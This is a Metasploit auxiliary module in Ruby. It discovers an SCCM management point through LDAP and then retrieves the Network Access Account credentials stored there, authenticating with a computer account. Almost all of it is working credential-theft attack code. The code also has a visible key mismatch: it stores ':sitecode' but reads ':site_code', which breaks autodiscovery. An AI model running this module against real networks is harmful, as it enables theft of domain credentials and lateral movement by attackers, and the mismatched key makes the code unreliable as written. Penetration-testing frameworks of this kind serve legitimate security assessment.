##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::HTTP::SCCM
  include Msf::Exploit::Remote::LDAP
  include Msf::OptionalSession::LDAP

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Get NAA Credentials',
        'Description' => %q{
          This module attempts to retrieve the Network Access Account(s), if configured, from the SCCM server.
          This requires a computer account, which can be added using the samr_account module.
        },
        'Author' => [
          'xpn',     # Initial research
          'skelsec', # Initial obfuscation port
          'smashery' # module author
        ],
        'References' => [
          ['URL', 'https://blog.xpnsec.com/unobfuscating-network-access-accounts/'],
          ['URL', 'https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2_description.md'],
          ['URL', 'https://github.com/Mayyhem/SharpSCCM'],
          ['URL', 'https://github.com/garrettfoster13/sccmhunter']
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [CONFIG_CHANGES],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptAddressRange.new('RHOSTS', [ false, 'The domain controller (for autodiscovery). Not required if providing a management point and site code' ]),
      OptPort.new('RPORT', [ false, 'The LDAP port of the domain controller (for autodiscovery). Not required if providing a management point and site code', 389 ]),
      OptString.new('COMPUTER_USER', [ true, 'The username of a computer account' ]),
      OptString.new('COMPUTER_PASS', [ true, 'The password of the provided computer account' ]),
      OptString.new('MANAGEMENT_POINT', [ false, 'The management point (SCCM server) to use' ]),
      OptString.new('SITE_CODE', [ false, 'The site code to use on the management point' ]),
      OptString.new('DOMAIN', [ true, 'The domain to authenticate to', '' ])
    ])

    deregister_options('LDAPDomain') # deregister LDAPDomain because DOMAIN is registered and used for both LDAP and HTTP

    @session_or_rhost_required = false
  end

  def find_management_point
    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        if (@base_dn = ldap.base_dn)
          print_status("#{ldap.peerinfo} Discovered base DN: #{@base_dn}")
        else
          fail_with(Msf::Module::Failure::UnexpectedReply, "Couldn't discover base DN!")
        end
      end
      raw_objects = ldap.search(base: @base_dn, filter: '(objectclass=mssmsmanagementpoint)', attributes: ['*'])
      return nil unless raw_objects.any?

      raw_obj = raw_objects.first

      raw_objects.each do |ro|
        print_good("Found Management Point: #{ro[:dnshostname].first} (Site code: #{ro[:mssmssitecode].first})")
      end

      if raw_objects.length > 1
        print_warning("Found more than one Management Point. Using the first (#{raw_obj[:dnshostname].first})")
      end

      obj = {}
      obj[:rhost] = raw_obj[:dnshostname].first
      obj[:sitecode] = raw_obj[:mssmssitecode].first

      obj
    rescue Errno::ECONNRESET
      fail_with(Msf::Module::Failure::Disconnected, 'The connection was reset.')
    rescue Rex::ConnectionError => e
      fail_with(Msf::Module::Failure::Unreachable, e.message)
    rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
      fail_with(Msf::Module::Failure::NoAccess, e.message)
    rescue Net::LDAP::Error => e
      fail_with(Msf::Module::Failure::Unknown, "#{e.class}: #{e.message}")
    end
  end

  def run
    management_point = datastore['MANAGEMENT_POINT']
    site_code = datastore['SITE_CODE']
    if management_point.blank? != site_code.blank?
      fail_with(Failure::BadConfig, 'Provide both MANAGEMENT_POINT and SITE_CODE, or neither (to perform autodiscovery)')
    end

    if management_point.blank?
      begin
        result = find_management_point
        fail_with(Failure::NotFound, 'Failed to find management point') unless result
        management_point = result[:rhost]
        site_code = result[:site_code]
      rescue ::IOError => e
        fail_with(Failure::UnexpectedReply, e.message)
      end
    end

    opts = {
      'username' => datastore['COMPUTER_USER'],
      'password' => datastore['COMPUTER_PASS']
    }
    computer_user = datastore['COMPUTER_USER'].delete_suffix('$')
    get_naa_credentials(opts, management_point, site_code, computer_user)
  end
end
